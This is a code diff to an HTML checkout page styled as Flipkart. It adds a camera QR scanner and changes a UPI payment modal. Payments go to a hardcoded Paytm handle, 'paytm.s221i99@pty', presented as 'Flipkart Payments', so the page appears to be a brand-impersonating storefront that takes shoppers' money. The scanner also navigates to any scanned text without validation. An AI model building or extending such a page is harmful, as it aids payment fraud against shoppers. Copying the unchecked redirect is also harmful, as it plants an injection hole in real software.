@@ -8,6 +8,8 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- ✅ HTML5 QR Code Scanner Library -->
+    <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
     
     <style>
         :root {
@@ -665,14 +667,18 @@
             color: var(--primary-blue);
             margin: 4px 0;
         }
-        .qr-modal-box .qr-actions {
+
+        /* QR Actions */
+        .qr-actions {
             display: flex;
+            flex-wrap: wrap;
             gap: 10px;
             margin: 12px 0;
         }
-        .qr-modal-box .qr-actions button {
+        .qr-actions button {
             flex: 1;
-            padding: 12px;
+            min-width: 100px;
+            padding: 12px 16px;
             border: none;
             border-radius: 10px;
             font-size: 14px;
@@ -684,23 +690,31 @@
             justify-content: center;
             gap: 8px;
         }
-        .qr-modal-box .qr-actions .btn-download {
+        .qr-actions .btn-download {
             background: #2874f0;
             color: #fff;
         }
-        .qr-modal-box .qr-actions .btn-download:hover {
+        .qr-actions .btn-download:hover {
             background: #1a5bc7;
             transform: translateY(-2px);
         }
-        .qr-modal-box .qr-actions .btn-scan {
+        .qr-actions .btn-scan {
             background: #fb641b;
             color: #fff;
         }
-        .qr-modal-box .qr-actions .btn-scan:hover {
+        .qr-actions .btn-scan:hover {
             background: #e85a0e;
             transform: translateY(-2px);
         }
-        .qr-modal-box .qr-close-btn {
+        .qr-actions .btn-stop-scan {
+            background: #dc3545;
+            color: #fff;
+        }
+        .qr-actions .btn-stop-scan:hover {
+            background: #c82333;
+        }
+
+        .qr-close-btn {
             width: 100%;
             padding: 12px;
             background: #e0e0e0;
@@ -713,8 +727,63 @@
             transition: all 0.3s ease;
             margin-top: 6px;
         }
-        .qr-modal-box .qr-close-btn:hover {
+        .qr-close-btn:hover {
             background: #d0d0d0;
+        }
+
+        /* Scanner Container */
+        .scanner-container {
+            width: 100%;
+            max-width: 350px;
+            margin: 10px auto;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #000;
+            position: relative;
+        }
+        .scanner-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .scanner-container #scanner-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            border: 3px solid #00ff00;
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+            pointer-events: none;
+        }
+        .scanner-container .scan-instruction {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.7);
+            color: #fff;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+
+        /* Scan Result */
+        .scan-result {
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 8px 0;
+            display: none;
+            font-size: 14px;
+            color: #2e7d32;
+        }
+        .scan-result.show {
+            display: block;
+            animation: fadeInUp 0.4s ease;
         }
 
         @media (max-width: 575.98px) {
@@ -743,7 +812,9 @@
             .detail-header .header-title { font-size: 14px; }
             .qr-modal-box { padding: 20px; }
             .qr-modal-box .qr-image img { width: 180px; height: 180px; }
-            .qr-modal-box .qr-actions { flex-direction: column; }
+            .qr-actions { flex-direction: column; }
+            .qr-actions button { min-width: auto; }
+            .scanner-container { max-width: 280px; }
         }
     </style>
 </head>
@@ -1017,26 +1088,44 @@
         <div class="qr-modal-box">
             <h3>Scan to Pay</h3>
             <div class="qr-amount">₹<span id="qrAmount">0</span></div>
+            
+            <!-- QR Image -->
             <div class="qr-image">
                 <img id="qrImage" src="" alt="UPI QR Code" />
             </div>
+            
             <div class="qr-order-id">Order: <span id="qrOrderId">FLIP-XXXXXX</span></div>
             <div class="qr-upi-id">
                 <i class="fas fa-circle-check"></i> 
                 <span id="qrUPI">paytm.s221i99@pty</span>
             </div>
             <div class="qr-app-name" id="qrAppName">📱 PhonePe</div>
-            <p style="color:#888; font-size:13px; margin:4px 0 12px;">
+            <p style="color:#888; font-size:13px; margin:4px 0 8px;">
                 <i class="fas fa-phone"></i> Scan with selected UPI app
             </p>
 
-            <!-- ✅ QR Actions: Download & Scan (Pay Now) -->
+            <!-- ✅ Scanner Container -->
+            <div class="scanner-container" id="scannerContainer" style="display:none;">
+                <div id="scannerReader"></div>
+                <div id="scanner-overlay"></div>
+                <div class="scan-instruction">📷 Place QR code in frame</div>
+            </div>
+
+            <!-- Scan Result -->
+            <div class="scan-result" id="scanResult">
+                <i class="fas fa-check-circle"></i> QR Scanned! Amount: ₹<span id="scannedAmount"></span>
+            </div>
+
+            <!-- ✅ QR Actions -->
             <div class="qr-actions">
                 <button class="btn-download" onclick="downloadQR()">
                     <i class="fas fa-download"></i> Download QR
                 </button>
-                <button class="btn-scan" id="btnStartScan" onclick="openUPIApp()">
-                    <i class="fas fa-camera"></i> Pay Now
+                <button class="btn-scan" id="btnStartScan" onclick="startScanner()">
+                    <i class="fas fa-camera"></i> Scan QR
+                </button>
+                <button class="btn-stop-scan" id="btnStopScan" onclick="stopScanner()" style="display:none;">
+                    <i class="fas fa-stop"></i> Stop
                 </button>
             </div>
 
@@ -1120,6 +1209,8 @@
         let currentOrderStep = 1;
         let selectedPayment = null;
         let orders = [];
+        let html5QrCode = null;
+        let isScanning = false;
 
         // ============================================================
         // GO BACK
@@ -1410,7 +1501,7 @@
         }
 
         // ============================================================
-        // CONFIRM ORDER – QR কোড তৈরি করবে (ডিপ লিংক ছাড়া)
+        // CONFIRM ORDER – QR কোড তৈরি করবে (প্রাইস ছাড়া)
         // ============================================================
         function confirmOrderWithQR() {
             if (!selectedPayment) { showToast('❌ Please select a payment method'); return; }
@@ -1460,9 +1551,9 @@
                 localStorage.setItem('orders', JSON.stringify(orders));
             } catch(e) {}
 
-            // ✅ QR কোড তৈরি (UPI লিংক সহ – কিন্তু ডিপ লিংক হিসেবে ব্যবহার হবে না, শুধু QR তে থাকবে)
+            // ✅ QR কোড তৈরি (প্রাইস ছাড়া)
             const receiver = method.receiver || 'paytm.s221i99@pty';
-            const upiURL = `upi://pay?pa=${receiver}&pn=Flipkart%20Payments&am=${amount}&cu=INR&tn=Order_${orderId}`;
+            const upiURL = `upi://pay?pa=${receiver}&pn=Flipkart%20Payments&cu=INR&tn=Order_${orderId}`;
             const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(upiURL)}&bgcolor=ffffff&color=000000`;
 
             // QR মডাল দেখান
@@ -1480,28 +1571,101 @@
         }
 
         // ============================================================
-        // ✅ Scan QR বাটন – অটোমেটিক UPI অ্যাপ ওপেন করবে (ডিপ লিংক)
+        // QR SCANNER – ক্যামেরা ওপেন করবে, অটোমেটিক স্ক্যান করবে
         // ============================================================
-        function openUPIApp() {
-            const upiID = document.getElementById('qrUPI').textContent;
-            const amount = document.getElementById('qrAmount').textContent;
-            const orderId = document.getElementById('qrOrderId').textContent;
+        function startScanner() {
+            const container = document.getElementById('scannerContainer');
+            const readerElement = document.getElementById('scannerReader');
             
-            if (!upiID) { 
-                showToast('❌ No UPI ID found'); 
+            if (!container || !readerElement) { 
+                showToast('❌ Scanner not available'); 
                 return; 
             }
-            
-            // UPI লিংক তৈরি (প্রাইস সহ)
-            const upiURL = `upi://pay?pa=${upiID}&pn=Flipkart%20Payments&am=${amount}&cu=INR&tn=Order_${orderId}`;
-            
-            // মোবাইল ডিভাইস চেক
-            if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                window.location.href = upiURL;
-                showToast('⏳ Opening UPI app...');
-            } else {
-                showToast('⚠️ Please scan QR code from your mobile');
+
+            if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                showToast('⚠️ Camera scanning is only available on mobile devices');
+                return;
             }
+
+            if (html5QrCode) {
+                try { 
+                    html5QrCode.stop().then(() => { 
+                        html5QrCode.clear(); 
+                    }); 
+                } catch(e) {}
+                html5QrCode = null;
+            }
+
+            container.style.display = 'block';
+            document.getElementById('btnStartScan').style.display = 'none';
+            document.getElementById('btnStopScan').style.display = 'inline-flex';
+            document.getElementById('scanResult').classList.remove('show');
+
+            try {
+                html5QrCode = new Html5Qrcode("scannerReader");
+                const config = {
+                    fps: 10,
+                    qrbox: { width: 250, height: 250 },
+                    aspectRatio: 1.0
+                };
+
+                html5QrCode.start(
+                    { facingMode: "environment" },
+                    config,
+                    onScanSuccess,
+                    onScanError
+                );
+                isScanning = true;
+                showToast('📷 Place QR code in frame');
+            } catch (err) {
+                console.error(err);
+                showToast('❌ Could not start camera: ' + err.message);
+                container.style.display = 'none';
+                document.getElementById('btnStartScan').style.display = 'inline-flex';
+                document.getElementById('btnStopScan').style.display = 'none';
+                isScanning = false;
+            }
+        }
+
+        // ============================================================
+        // অটোমেটিক স্ক্যান সফল হলে – UPI অ্যাপ ওপেন করবে
+        // ============================================================
+        function onScanSuccess(decodedText, decodedResult) {
+            stopScanner();
+            
+            let amount = 'N/A';
+            try {
+                const urlParams = new URLSearchParams(decodedText.split('?')[1]);
+                if (urlParams.has('am')) amount = urlParams.get('am');
+            } catch(e) {}
+            
+            document.getElementById('scannedAmount').textContent = amount;
+            document.getElementById('scanResult').classList.add('show');
+            showToast('✅ QR Scanned! Opening UPI app...');
+            
+            // স্ক্যান হওয়া লিংকটি ওপেন করুন (UPI অ্যাপ ওপেন হবে)
+            setTimeout(() => {
+                window.location.href = decodedText;
+            }, 500);
+        }
+
+        function onScanError(err) {
+            // ইরর ইগনোর করুন
+        }
+
+        function stopScanner() {
+            if (html5QrCode) {
+                try {
+                    html5QrCode.stop().then(() => {
+                        html5QrCode.clear();
+                        html5QrCode = null;
+                    }).catch(() => {});
+                } catch(e) {}
+            }
+            document.getElementById('scannerContainer').style.display = 'none';
+            document.getElementById('btnStartScan').style.display = 'inline-flex';
+            document.getElementById('btnStopScan').style.display = 'none';
+            isScanning = false;
         }
 
         // ============================================================
@@ -1527,6 +1691,7 @@
         // QR MODAL ক্লোজ
         // ============================================================
         function closeQRModal() {
+            if (isScanning) stopScanner();
             document.getElementById('qrModal').classList.remove('active');
             document.body.style.overflow = '';
         }
@@ -1604,7 +1769,8 @@
         window.goToOrderStep = goToOrderStep;
         window.selectOrderPayment = selectOrderPayment;
         window.confirmOrderWithQR = confirmOrderWithQR;
-        window.openUPIApp = openUPIApp;
+        window.startScanner = startScanner;
+        window.stopScanner = stopScanner;
         window.downloadQR = downloadQR;
         window.closeQRModal = closeQRModal;
         window.addToCart = addToCart;
